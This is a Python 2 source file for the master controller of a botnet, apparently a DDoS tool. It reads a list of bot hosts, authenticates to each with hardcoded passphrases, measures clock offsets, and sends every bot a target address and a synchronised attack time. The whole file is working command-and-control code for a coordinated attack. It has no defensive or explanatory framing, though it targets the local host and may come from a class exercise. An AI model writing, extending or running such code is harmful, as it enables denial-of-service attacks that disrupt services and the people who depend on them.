#!/usr/bin/env python

import socket
import time
import Util

class Master:

   MASTER_PASSPHRASE = 'gits#9sac'
   BOT_PASSPHRASE    = 'standalone'
   CODE_00 = '00' # send current time
   CODE_01 = '01' # send target info

   def __init__(self):
      print 'Initializing Master...'

      self.target = (str(socket.gethostname()), 8080)
      self.targetStr = str(self.target[0]) + ':' + str(self.target[1]) 

      # list containing host names, ports and delta time for the bots
      self.bots = []

      self.readBotsFile()
      self.outputBots()

      self.connectToBots()

   def readBotsFile(self):
      print 'Reading Bots file...'

      with open("bots_list.txt") as botsFile:
         for line in botsFile:
            host, sep, port = line.partition(":")
            self.bots.append([host.strip(), int(port.strip()), int(0)])

   def outputBots(self):
      print '\nCurrent Bots (host:port):'
      
      for i, bot in enumerate(self.bots):
         print "%s:%d" % (bot[0], bot[1])
         # print "%s:%d (%d)" % (bot[0], bot[1], bot[2])

      print ''

   def connectToBots(self):
      for i, bot in enumerate(self.bots):
         print 'Connecting to Bot @ %s:%d...' % (bot[0], bot[1])
         botSocket = socket.socket()
         botSocket.connect((bot[0], bot[1]))
         # botSocket.connect((socket.gethostname(), 21800))

         print 'Connected'

         # second master passphrase
         Util.send(botSocket, self.MASTER_PASSPHRASE)

         # receive client's passphrase
         recvdPassphrase = Util.recieve(botSocket)

         if recvdPassphrase != self.BOT_PASSPHRASE:
            print 'Bot @ ' + '%s:%d' % (bot[0], bot[1]) + ' compromised!'
            botSocket.close()
            continue

         Util.send(botSocket, self.CODE_00)

         # receive bot time
         botTime = Util.recieve(botSocket)

         # set delta time for bot
         myTime = int(Util.getCurrTime())
         botTime = int(botTime.strip())
         delta = myTime - botTime
         print 'Current time: ' + str(myTime)
         print 'Bot time: ' + str(botTime)
         print 'Time difference: ' + str(delta)
         self.bots[i][2] = delta

         atkTime = int(Util.getCurrTime()) + 10000
         Util.send(botSocket, self.targetStr + '@' + \
            str(int(self.bots[i][2] + atkTime)))

         print 'Bot @ ' + '%s:%d (%d)' % (bot[0], bot[1], self.bots[i][2]) + \
            ' is ready to attack!'
         botSocket.close()

if __name__ == '__main__':
   master = Master()
